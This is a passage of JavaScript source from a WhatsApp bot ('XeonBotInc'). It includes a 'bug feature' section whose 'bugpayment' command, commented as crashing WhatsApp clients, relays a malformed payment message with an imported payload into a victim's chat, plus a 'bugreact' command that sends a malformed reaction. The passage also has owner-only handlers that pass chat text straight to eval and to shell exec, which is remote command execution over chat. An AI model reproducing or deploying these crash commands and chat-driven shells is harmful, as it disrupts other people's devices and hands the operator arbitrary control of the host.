                XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul: *${result.title}*\n${themeemoji} Sumber: *${result.source}*\n${themeemoji} Tautan Media: *${result.image}*`, image: { url: result.image }} , { quoted: m })
            }
            break
	//bug feature
case 'bugpayment' : { //crashes mod whatsapps
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Format: *${prefix + command} Nama*`)
const { xeonorwot } = require('./XBug/xeonbut2')
let teks = `${text}`
{
XeonBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${xeonorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA XEON`,"body": ` ${xeonytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: xwebsite,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'bugreact':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

default:
if (budy.startsWith('<')) {
if (!XeonTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!XeonTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!XeonTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})